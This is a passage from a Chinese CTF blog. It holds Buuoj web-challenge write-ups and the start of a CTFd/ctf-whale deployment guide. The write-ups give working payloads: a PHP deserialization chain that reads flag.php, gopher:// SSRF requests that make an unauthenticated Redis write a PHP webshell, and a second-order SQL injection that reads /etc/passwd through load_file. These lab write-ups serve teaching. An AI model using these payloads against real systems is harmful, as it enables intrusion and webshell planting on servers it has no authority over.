punctuation">.</span><span class="token double-quoted-string string">"\r\n"</span><span class="token punctuation">;</span><span class="token comment">//O:4:"Show":2:&#123;s:6:"source";O:4:"Show":2:&#123;s:6:"source";s:3:"123";s:3:"str";O:4:"Test":1:&#123;s:1:"p";O:8:"Modifier":1:&#123;s:6:" * var";s:52:"php://filter/convert.base64-encode/resource=flag.php";&#125;&#125;&#125;s:3:"str";N;&#125;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BO%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3Bs%3A3%3A%22123%22%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A52%3A%22php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7D%7Ds%3A3%3A%22str%22%3BN%3B%7D</span></span></code></pre><p>这里还有小注意点，题目中的php版本为 5.6.40 ，这个版本反序列化对于<code>protected</code>与<code>public</code>类别还是敏感的，可以看到这里是有<code>%00</code>存在的</p><img src="/article/Buuoj-WEB-Write-up/image-20201218135255308.png" class="" title="image-20201218135255308"><p>可见字符4个，前后都是<code>%00</code>，这时通过数据表传参可能会不准确，例如我本地调会显示如下</p><img src="/article/Buuoj-WEB-Write-up/image-20201218135449017.png" class="" title="image-20201218135449017"><img src="/article/Buuoj-WEB-Write-up/image-20201218135521199.png" class="" title="image-20201218135521199"><img src="/article/Buuoj-WEB-Write-up/image-20201218135543020.png" class="" title="image-20201218135543020"><p>所以我们最后进行<code>urlencode</code>，保证<code>%00</code>正常传入</p><img src="/article/Buuoj-WEB-Write-up/image-20201218135722862.png" class="" title="image-20201218135722862"><p>最后包含<code>flag.php</code>，拿到flag</p><hr><h2 id="GKCTF2020-EZ三剑客-EzWeb"><a href="#GKCTF2020-EZ三剑客-EzWeb" class="headerlink" title="[GKCTF2020]EZ三剑客-EzWeb"></a>[GKCTF2020]EZ三剑客-EzWeb</h2><h5 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h5><p>打开题目</p><img src="/article/Buuoj-WEB-Write-up/image-20201223182110711.png" class="" title="image-20201223182110711"><p>跟url有关，可能是ssrf，命令执行等，先输入<code>127.0.0.1&amp;whoami</code></p><img src="/article/Buuoj-WEB-Write-up/image-20201223182233706.png" class="" title="image-20201223182233706"><p>被ban，查看源码发现提示<code>?secret</code></p><img src="/article/Buuoj-WEB-Write-up/image-20201223182323977.png" class="" title="image-20201223182323977"><p>发现是linux命令<code>ifconfig</code>内容，考点应该是ssrf打内网</p><p>尝试用<code>file:/</code>读取文件发现被ban，使用 <code>file：/</code>、<code>file:&lt;空格&gt;///</code> 绕过</p><p>读到源码</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">function</span> <span class="token function">curl</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//echo $url."\n";</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/file\:\/\/|dict|\.\.\/|127.0.0.1|localhost/is'</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">,</span><span class="token variable">$match</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//var_dump($match);</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'别这样'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">curl</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'secret'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'ifconfig'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>ban了<code>file://</code>，<code>dict://</code>，<code>127.0.0.1</code>和<code>localhost</code>，应该是要找本机的服务，爆破下内网同网段下存活主机</p><img src="/article/Buuoj-WEB-Write-up/image-20201223182749451.png" class="" title="image-20201223182749451"><img src="/article/Buuoj-WEB-Write-up/image-20201223182807801.png" class="" title="image-20201223182807801"><p>在<code>10.138.132.10</code>发现提示，爆破其端口，猜测为mysql，redis之类的服务</p><img src="/article/Buuoj-WEB-Write-up/image-20201223184447546.png" class="" title="image-20201223184447546"><p>在6379端口发现异常，至此明白为redis漏洞</p><p>尝试打redis未授权访问漏洞</p><p>payload:</p><pre class="language-php" data-language="php"><code class="language-php">gopher<span class="token punctuation">:</span><span class="token comment">//10.138.132.10:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2440%0D%0A%0A%0A%3C%3Fphp%20system%28%22find%20/%20-name%20fla%2A%22%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A</span></code></pre><p>在目标主机上生成<code>shell.php</code>，扫描<code>fla*</code>，以确定flag位置</p><img src="/article/Buuoj-WEB-Write-up/image-20201223184856356.png" class="" title="image-20201223184856356"><p>排除其他可能，确认flag在根目录，再打</p><pre class="language-php" data-language="php"><code class="language-php">gopher<span class="token punctuation">:</span><span class="token comment">//10.138.132.10:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2432%0D%0A%0A%0A%3C%3Fphp%20system%28%22cat%20/flag%22%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A</span></code></pre><p><code>cat /flag</code></p><img src="/article/Buuoj-WEB-Write-up/image-20201223185801498.png" class="" title="image-20201223185801498"><hr><h2 id="网鼎杯-2018-Comment"><a href="#网鼎杯-2018-Comment" class="headerlink" title="[网鼎杯 2018]Comment"></a>[网鼎杯 2018]Comment</h2><p>打开题目为留言板，猜测SSTI，sql注入之类的。</p><p>随便留言后跳转登陆界面，sql注入测试无果，看框内字符串，弱密码爆破一波</p><img src="/article/Buuoj-WEB-Write-up/image-20201223193659732.png" class="" title="image-20201223193659732"><img src="/article/Buuoj-WEB-Write-up/image-20201223203540497.png" class="" title="image-20201223203540497"><p>爆破密码为<code>zhangwei666</code></p><p>进去尝试SSTI,sql注入无果，但是sql注入语句被过滤。</p><p>站内查找，发现git泄露</p><img src="/article/Buuoj-WEB-Write-up/image-20201223201810099.png" class="" title="image-20201223201810099"><p><code>writr_do.php</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span> <span class="token double-quoted-string string">"mysql.php"</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'login'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token single-quoted-string string">'yes'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Location: ./login.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'do'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'do'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">case</span> <span class="token single-quoted-string string">'write'</span><span class="token punctuation">:</span>    <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">case</span> <span class="token single-quoted-string string">'comment'</span><span class="token punctuation">:</span>    <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">default</span><span class="token punctuation">:</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Location: ./index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Location: ./index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>看起来代码肯定是删过的</p><p>然后发现其实原来需要git log 恢复，不得不说，git_extract真香，直接扒出原先的源码</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span> <span class="token double-quoted-string string">"mysql.php"</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'login'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token single-quoted-string string">'yes'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Location: ./login.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'do'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'do'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">case</span> <span class="token single-quoted-string string">'write'</span><span class="token punctuation">:</span>    <span class="token variable">$category</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'category'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$title</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'title'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"insert into board            set category = '<span class="token interpolation"><span class="token variable">$category</span></span>',                title = '<span class="token interpolation"><span class="token variable">$title</span></span>',                content = '<span class="token interpolation"><span class="token variable">$content</span></span>'"</span><span class="token punctuation">;</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Location: ./index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">case</span> <span class="token single-quoted-string string">'comment'</span><span class="token punctuation">:</span>    <span class="token variable">$bo_id</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'bo_id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"select category from board where id='<span class="token interpolation"><span class="token variable">$bo_id</span></span>'"</span><span class="token punctuation">;</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token function">mysql_num_rows</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$category</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'category'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"insert into comment            set category = '<span class="token interpolation"><span class="token variable">$category</span></span>',                content = '<span class="token interpolation"><span class="token variable">$content</span></span>',                bo_id = '<span class="token interpolation"><span class="token variable">$bo_id</span></span>'"</span><span class="token punctuation">;</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Location: ./comment.php?id=<span class="token interpolation"><span class="token variable">$bo_id</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">default</span><span class="token punctuation">:</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Location: ./index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Location: ./index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>关键语句<code>select category from board where id=</code>，comment查询类别会进行直接查询，所以为sql二次注入</p><p>留言会进行查询，所以现在就要构造二次注入</p><p>语句</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"insert into comment            set category = '<span class="token interpolation"><span class="token variable">$category</span></span>',                content = '<span class="token interpolation"><span class="token variable">$content</span></span>',                bo_id = '<span class="token interpolation"><span class="token variable">$bo_id</span></span>'"</span><span class="token punctuation">;</span>即 <span class="token double-quoted-string string">"insert into comment set category = '<span class="token interpolation"><span class="token variable">$category</span></span>', content = '<span class="token interpolation"><span class="token variable">$content</span></span>', bo_id = '<span class="token interpolation"><span class="token variable">$bo_id</span></span>'"</span><span class="token punctuation">;</span></code></pre><p>其中变量都可控，由于sql中单句换行，<code>#</code>只能注释单行，所以使用<code>/**/</code>注释</p><p>变为</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"insert into comment            set category = '',content=user(),/*',                content = '*/#',                bo_id = '<span class="token interpolation"><span class="token variable">$bo_id</span></span>'"</span><span class="token punctuation">;</span>即 <span class="token double-quoted-string string">"insert into comment set category = '',content=user(),/*', content = '*/#', bo_id = '<span class="token interpolation"><span class="token variable">$bo_id</span></span>'"</span><span class="token punctuation">;</span>等价于 <span class="token double-quoted-string string">"insert into comment set category = '',content=user(),#', bo_id = '<span class="token interpolation"><span class="token variable">$bo_id</span></span>'"</span><span class="token punctuation">;</span></code></pre><img src="/article/Buuoj-WEB-Write-up/image-20201223203506275.png" class="" title="image-20201223203506275"><img src="/article/Buuoj-WEB-Write-up/image-20201223203606551.png" class="" title="image-20201223203606551"><img src="/article/Buuoj-WEB-Write-up/image-20201223203616701.png" class="" title="image-20201223203616701"><p>可以执行命令，注入无果， 转而用load_file读取下/etc/passwd </p><img src="/article/Buuoj-WEB-Write-up/image-20201223204451913.png" class="" title="image-20201223204451913"><p>www用户有bash执行权限</p><p>读取www用户bash历史记录</p><img src="/article/Buuoj-WEB-Write-up/image-20201223204754524.png" class="" title="image-20201223204754524"><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /tmp/<span class="token function">unzip</span> html.zip<span class="token function">rm</span> -f html.zip<span class="token function">cp</span> -r html /var/www/<span class="token builtin class-name">cd</span> /var/www/html/<span class="token function">rm</span> -f .DS_Store<span class="token function">service</span> apache2 start</code></pre><p>所以<code>/tmp/html</code>目录没删，但是不知道目录文件，只知道有个<code>.DS_Store</code></p><p>读取发现是乱码，转用hex编码读取</p><img src="/article/Buuoj-WEB-Write-up/image-20201223205134946.png" class="" title="image-20201223205134946"><p>脚本恢复下</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token triple-quoted-string string">"""@Time ： 2020/12/23 20:52@Auth ： gyy@File ：exp1.py@Blog：http://err0r.top"""</span><span class="token keyword">import</span> binasciihexdata <span class="token operator">=</span> <span class="token stringspan>data <span class="token operator">=</span> binascii<span class="token punctuation">.</span>a2b_hex<span class="token punctuation">(</span>hexdata<span class="token punctuation">)</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">".DS_Store"</span><span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>data<span class="token punctuation">)</span></code></pre><p>读取到</p><img src="/article/Buuoj-WEB-Write-up/image-20201223210658137.png" class="" title="image-20201223210658137"><p>直接读取</p><img src="/article/Buuoj-WEB-Write-up/image-20201223211015299.png" class="" title="image-20201223211015299"><p>网鼎杯的题还是很顶的</p><p>后记：</p><img src="/article/Buuoj-WEB-Write-up/image-20201223211725414.png" class="" title="image-20201223211725414"><p>然后发现答案错误…</p><img src="/article/Buuoj-WEB-Write-up/image-20201223211919615.png" class="" title="image-20201223211919615"><p>正确方法是取<code>/var/www/html/</code>下的那个文件读，因为动态靶机的缘故，送flag进靶机没有照顾到这题呀…</p><hr>]]></content>
      
      
      <categories>
          
          <category> Write-Up </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CTFD支持动态靶机的搭建笔记（docker：ctfd+ctf-whale）2020.10.16</title>
      <link href="article/CTFD/"/>
      <url>article/CTFD/</url>
      
        <content type="html"><![CDATA[<h1 id="CTFD支持动态靶机的搭建笔记（docker：ctfd-ctf-whale）2020-10-17"><a href="#CTFD支持动态靶机的搭建笔记（docker：ctfd-ctf-whale）2020-10-17" class="headerlink" title="CTFD支持动态靶机的搭建笔记（docker：ctfd+ctf-whale）2020.10.17"></a>CTFD支持动态靶机的搭建笔记（docker：ctfd+ctf-whale）2020.10.17</h1><h2 id="本篇文章最后更新于2020-10-17"><a href="#本篇文章最后更新于2020-10-17" class="headerlink" title="本篇文章最后更新于2020.10.17"></a>本篇文章最后更新于2020.10.17</h2><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>ctfd可以说是如今最方便的ctf靶场搭建平台，支持各种插件与二次开发，<a href="https://www.zhaoj.in/">赵师傅</a>早前写了一款插件ctf-whale非常方便，但本人在搭建的过程中遇到了不少问题，经过不断研究终于完成，特此记录，以防后期忘记，也供大家交流学习。<br>赵师傅开发的插件是为了适合 <a href="https://buuoj.cn/">buu</a> 的架构,本篇文章采用完整流程+填坑讲解的格式。</p><h4 id="强调！"><a href="#强调！" class="headerlink" title="强调！"></a>强调！</h4><p>由于国内git clone实在太慢，本人采用的方法是科学上网下载zip解压的方式，可自行百度git clong与Download zip的区别。本篇文章是用本地下载zip解压上传的方式完成<strong>在服务器上</strong>搭建</p><p>如果阅读中操作出现问题请自行百度，翻到文末查看坑点讲解或者查看其它搭建文章</p><p>这里感谢赵师傅zhaoj，fjh1997等前辈写的文章指导，读者遇到问题或有不足或缺陷的地方请私信我添加改正</p><h2 id="事前准备"><a href="#事前准备" class="headerlink" title="事前准备"></a>事前准备</h2><p><strong>注意</strong>：本机为CentOS7<br>要求：</p><ol><li>已安装基础环境，熟悉linux基本操作</li><li>已安装好 Docker 和 Docker-Compose，并且启用 Docker Swarm，完成换源等操作</li><li>会<em>科学上网</em></li><li>有绝对的耐心</li></ol><p>需求：</p><ol><li>下载赵师傅改写的ctfd，赵师傅已经完成了镜像换源等操作</li></ol><pre class="language-none"><code class="language-none">https:&#x2F;&#x2F;github.com&#x2F;glzjin&#x2F;CTFd.git -&gt;赵师傅仓库</code></pre><ol start="2"><li>下载frp</li></ol><pre class="language-none"><code class="language-none">wget https:&#x2F;&#x2F;github.com&#x2F;fatedier&#x2F;frp&#x2F;releases&#x2F;download&#x2F;v0.29.0&#x2F;frp_0.29.0_linux_amd64.tar.gztar -zxvf frp_0.29.0_linux_amd64.tar.gz</code></pre><p>也可以直接访问链接下载然后解压上传</p><ol start="3"><li>下载ctf-whale</li></ol><pre class="language-none"><code class="language-none">https:&#x2F;&#x2F;github.com&#x2F;glzjin&#x2F;CTFd-Whale</code></pre><ol start="4"><li>下载docker的frps<br>这里在赵师傅仓库里扒拉发现的<pre class="language-none"><code class="language-none">https:&#x2F;&#x2F;github.com&#x2F;glzjin&#x2F;Frp-Docker-For-CTFd-Whale</code></pre></li></ol><p>以上除ctfd解压后请确保字母小写，并只有一级文件夹</p><hr><h2 id="安装步骤"><a href="#安装步骤" class="headerlink" title="安装步骤"></a>安装步骤</h2><h3 id="1-docker集群设置"><a href="#1-docker集群设置" class="headerlink" title="1.docker集群设置"></a>1.docker集群设置</h3><p>输入命令</p><pre class="language-none"><code class="language-none">docker swarm initdocker node lsdocker node update --label-add name&#x3D;linux-1 &lt;节点 ID&gt;</code></pre><img src="/article/CTFD/20201017233032375.png" class="" title="docker集群设置"><p>具体原理等可以查看其它ctfd搭建文章，文末会贴出，这里不做过多阐述</p><h3 id="2-放入ctfd-whale"><a href="#2-放入ctfd-whale" class="headerlink" title="2.放入ctfd-whale"></a>2.放入ctfd-whale</h3><p>将解压的ctfd-whale改小写后放入/CTFd/CTFd/plugins</p><h3 id="3-安装frps（这里有其他教程写的是不对的）"><a href="#3-安装frps（这里有其他教程写的是不对的）" class="headerlink" title="3.安装frps（这里有其他教程写的是不对的）"></a>3.安装frps（这里有其他教程写的是不对的）</h3><p>这里注意下，frp<strong>不是</strong>装在服务器机子上的，简单来说，frps与frpc都是在docker里的。（大坑在这里）<br>frpc是在ctfd里的，frps是在docker机里的</p><p>上传赵师傅的Frp-Docker-For-CTFd-Whale，进入目录后运行<code>docker-compose up -d</code>即可，然后<code>docker ps</code>可看到frps的容器运行中</p><img src="/article/CTFD/202010172331132.png" class="" title="frps"><p>这里看到frps有28000-28100，这是在<strong>Frp-Docker-For-CTFd-Whale里的docker-compose.yml</strong>，可更改配置后compose</p><pre class="language-none"><code class="language-none">version: &#39;2&#39;services:  frps:    image: glzjin&#x2F;frp:latest    restart: always    volumes:      - .&#x2F;frp:&#x2F;conf&#x2F;    entrypoint:        - &#x2F;usr&#x2F;local&#x2F;bin&#x2F;frps        - -c        - &#x2F;conf&#x2F;frps.ini    ports:      - &quot;28000-28100:28000-28100&quot;     #可更改开放端口      - &quot;6490:6490&quot;    #此处必须与frps.ini配置一致    networks:        default:networks:    default:</code></pre><p>再看一下/frp/frps.ini</p><pre class="language-none"><code class="language-none">[common]bind_port &#x3D; 6490token &#x3D; randomme</code></pre><h3 id="4-配置ctfd"><a href="#4-配置ctfd" class="headerlink" title="4.配置ctfd"></a>4.配置ctfd</h3><p>直接上<strong>ctfd的docker-compose.yml</strong>配置</p><pre class="language-none"><code class="language-none">version: &#39;2.2&#39;services:  ctfd-nginx:    image: nginx:1.17    volumes:      - .&#x2F;nginx&#x2F;http.conf:&#x2F;etc&#x2F;nginx&#x2F;nginx.conf   #这里注意    user: root    restart: always    ports:      #- &quot;85:80&quot;     #我将这里注释掉了，这里通过nginx转发感觉速度访问速度会变慢，多次尝试之后直接开8000端口访问不会对服务造成影响      - &quot;443:443&quot;    networks:        default:        internal:    depends_on:      - ctfd    cpus: &#39;1.00&#39;  #可改    mem_limit: 150M     #可改  ctfd:    build: .    user: root    restart: always    ports:      - &quot;8000:8000&quot;     #这里原本没开端口，直接打开访问网站速度会加快    environment:      - UPLOAD_FOLDER&#x3D;&#x2F;var&#x2F;uploads      - DATABASE_URL&#x3D;mysql+pymysql:&#x2F;&#x2F;root:ctfd@db&#x2F;ctfd      - REDIS_URL&#x3D;redis:&#x2F;&#x2F;cache:6379      - WORKERS&#x3D;1      - LOG_FOLDER&#x3D;&#x2F;var&#x2F;log&#x2F;CTFd      - ACCESS_LOG&#x3D;-      - ERROR_LOG&#x3D;-      - REVERSE_PROXY&#x3D;true    volumes:      - .data&#x2F;CTFd&#x2F;logs:&#x2F;var&#x2F;log&#x2F;CTFd      - .data&#x2F;CTFd&#x2F;uploads:&#x2F;var&#x2F;uploads      - .:&#x2F;opt&#x2F;CTFd:ro      - &#x2F;var&#x2F;run&#x2F;docker.sock:&#x2F;var&#x2F;run&#x2F;docker.sock     #这里是添加的    depends_on:      - db    networks:        default:        internal:        frp:            ipv4_address: 172.1.0.2    cpus: &#39;1.00&#39;     #可改    mem_limit: 450M     #可改  db:    image: mariadb:10.4    restart: always    environment:      - MYSQL_ROOT_PASSWORD&#x3D;ctfd      - MYSQL_USER&#x3D;ctfd      - MYSQL_PASSWORD&#x3D;ctfd    volumes:      - .data&#x2F;mysql:&#x2F;var&#x2F;lib&#x2F;mysql    networks:        internal:    # This command is required to set important mariadb defaults    command: [mysqld, --character-set-server&#x3D;utf8mb4, --collation-server&#x3D;utf8mb4_unicode_ci, --wait_timeout&#x3D;28800, --log-warnings&#x3D;0]    cpus: &#39;1.00&#39;     #可改    mem_limit: 750M   